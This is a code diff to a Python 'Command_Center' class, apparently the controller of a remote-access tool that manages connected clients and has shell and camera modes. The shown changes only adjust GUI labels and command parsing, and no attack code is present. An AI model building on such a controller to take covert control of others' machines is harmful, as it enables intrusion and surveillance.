@@ -66,7 +66,13 @@ class Command_Center():
     def start_server(self):
         if not self.check_addr():
             self.PrintSmart('\n[-] Check your Ip and Port')
+            if self.MODE == 'graphic':
+                self.Button_start_stop.configure(text='START SERVER')
             return
+        if self.MODE == 'graphic':
+            self.Button_start_stop.configure(text='STOP SERVER')
+            self.IPBOX.configure(text=f'IP:{self.IP}')
+            self.PORTBOX.configure(text=f'PORT:{self.PORT}')
         self.status = True
         self.server_thread = threading.Thread(target=self.server_main_function,daemon=True)
         self.server_thread.start()
@@ -185,8 +191,14 @@ class Command_Center():
                 self.PrintSmart(self.HELP)
             elif command.startswith('send'):
                 if self.status == True:
-                    if  len(command.split()) == 3:
-                        _, index ,msg= command.split()
+                    if  len(command.split(' ')) == 3:
+                        try:
+                            _, index ,msg= command.split(' ')
+                        except:
+                            self.PrintSmart('[- ] Enter the command without extra spaces')
+                            if self.MODE == 'graphic':
+                                return
+                            continue
                         try:
                             index = int(index)
 
@@ -257,8 +269,14 @@ class Command_Center():
                     self.PrintSmart('[-] The Server is Down')
             elif command.startswith('set'):
                 if self.status == False:
-                    if  len(command.split()) == 3:
-                        _, var , value = command.split(' ')
+                    if  len(command.split(' ')) == 3:
+                        try:
+                            _, var , value = command.split(' ')
+                        except:
+                            self.PrintSmart('[- ] Enter the command without extra spaces')
+                            if self.MODE == 'graphic':
+                                return
+                            continue
                         if var == 'IP':
                             self.IP = value
                         elif var == 'PORT':
@@ -271,8 +289,14 @@ class Command_Center():
                     self.PrintSmart('[-] The Server is Running')
             elif command.startswith('del'):
                 if self.status == True:  
-                    if  len(command.split()) == 2:
-                        _, index = command.split(' ')
+                    if  len(command.split(' ')) == 2:
+                        try:
+                            _, index = command.split(' ')
+                        except:
+                            self.PrintSmart('[-] Enter the command without extra spaces')
+                            if self.MODE == 'graphic':
+                                return
+                            continue
                         index = int(index)
                         try:
                             # self.PrintSmart('[+] Client removed ' + str(self.Clients[index].get_extra_info('peername')))
@@ -336,6 +360,9 @@ class Command_Center():
                 break
     def ButtonStart(self):
         if self.status == False:
+            if self.MODE == 'graphic':
+                self.IPBOX.configure(text=f'IP:{self.IP}')
+                self.PORTBOX.configure(text=f'PORT:{self.PORT}')
             self.Button_start_stop.configure(text='STOP SERVER')
             self.start_server()
         else:
@@ -688,6 +715,8 @@ class Command_Center():
                 print(txt)
 
     async def CloseServer(self):
+        if self.MODE == 'graphic':
+            self.Button_start_stop.configure(text='START SERVER')
         self.status = False
         self.status_shell = False
         self.status_camera = False
